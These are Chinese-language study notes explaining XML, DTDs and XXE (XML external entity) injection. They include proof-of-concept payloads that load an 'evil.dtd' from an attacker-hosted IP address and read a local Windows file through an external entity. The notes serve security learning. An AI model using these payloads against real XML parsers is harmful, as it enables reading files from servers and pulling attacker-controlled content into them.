# XXE

> #### :question: `xml`是什么
>
> `xml`是一种文件格式，成为可拓展性标记语言，与`HTML`十分类似。
>
> `xml`设计之初是用来对数据进行传输和储存，而不是像`HTML`一样偏重于展示数据。
>
> `xml`支持用户自定义标签。

> #### :question:  `DTD`是什么
>
> 因为`xml`支持自定义标签，需要有一个“校验”来保证`xml`格式正确，而`DTD`正是用来实现对`xml`的“校验”功能。
>
> ##### 外部引用
>
> ```xml-dtd
> //基本格式
> <!DOCTYPE 根元素名称 SYSTEM "外部DTD的路径"> 
> //外部引用DTD格式:
> <!ENTITY test SYSTEM "http://www.test.com/test.dtd">   	        //调用公网URL
> <!ENTITY test SYSTEM "file:///c:/test.dtd">     		//读取本地文件
> 
> //xml文件：引入DTD，调用元素显示。
> ```
>
> 外部引用时，不同语言支持的协议不同。
>
> ![](/run/user/1000/doc/490bc53f/1598365020.png)
>
> ##### 内部引用
>
> ```xml-dtd
> //定义DTD
> <?xml version="1.0"?>
> <!DOCTYPE person [
> <!ENTITY writer "Jack Wilson">
> <!ENTITY country "Copyright www.test.com">
> ]>
> //XML内部调用,实体有&/实体名称和分号结尾
> <person>&writer;&country;</person>
> ```
>
> ##### 公共引用
>
> ```xml-dtd
> //post型POC利用，这里的url一般是已经搭建的公网存放了恶意代码的服务器
> <?xml version="1.0" encoding="utf-8"?> 
> <!DOCTYPE xxe [<!ELEMENT name ANY >
> <!ENTITY %  xxe PUBLIC "public_id" "http://192.100.10.1:81/evil.dtd" >
> %xxe;]>
> <name>&evil;</name>
> 
> //外部 evil.dtd 中的内容(可以放在自己的服务器上)。 
> <!ENTITY evil SYSTEM "file:///c:/windows/win.ini" >  
> ```
>
> ##### 参数引用
>
> ```xml-dtd
> //参数DTD基本格式
> <!ENTITY % 实体名称 "实体的值">  或者  <!ENTITY % 实体名称  SYSTEM "URI">
> 
> //POC利用代码
> <?xml version="1.0" encoding="utf-8"?> 
> <!DOCTYPE xxe [<!ELEMENT name ANY >
> <!ENTITY %  xxe SYSTEM "http://192.168.10.31:81/evil.dtd" >
> %xxe;]>
> <name>&evil;</name>
> ```

`xml`支持在`DTD`中自定义实体，类似`c`中的宏定义，如下定义后，`xml`中所有的`&myentity`均会被替换为`value`。

```xml-dtd
<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>
```

`xml`还支持调用外部实体，即可以从文件或网络上加载实体。

```xml-dtd
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

